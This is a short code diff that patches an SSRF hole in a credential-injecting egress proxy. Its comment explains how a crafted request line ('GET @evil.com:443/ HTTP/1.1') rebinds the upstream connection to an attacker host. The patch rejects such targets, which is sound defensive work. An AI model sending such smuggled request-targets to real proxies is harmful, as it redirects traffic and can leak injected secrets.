@@ -882,6 +882,21 @@ class SecretEgressProxy:
 
         method = request.method.decode("ascii")
         target = request.target.decode("latin-1")  # request-target is bytes
+        # The request-target is spliced into the upstream URL *authority*
+        # position (``https://{pinned}:443{target}`` below), not the path. h11's
+        # SERVER parser is permissive and yields a non-origin target verbatim —
+        # ``GET @evil.com:443/ HTTP/1.1`` arrives here as ``target="@evil.com:443/"``
+        # with no complaint — so a target beginning with ``@`` is parsed by httpx
+        # as URL *userinfo* (``{pinned}:443``) with everything after the ``@`` as
+        # the host, rebinding the upstream connect to an attacker-chosen
+        # host:port and bypassing the only SSRF gate (``_resolve_pinned_ip`` only
+        # ever sees the SNI host). This proxy is the TLS-terminating origin, so
+        # the only valid request-target is origin-form (``/``-leading); reject
+        # absolute-form / asterisk-form / ``@``-form / authority-shaped targets
+        # BEFORE the body is read, the upstream is resolved, or the URL is built.
+        if not target.startswith("/"):
+            await self._send_simple(conn, writer, 400, b"invalid request-target")
+            return
         path = _request_path(target)
 
         # Per-request swap map: only creds whose host matches the SNI host AND
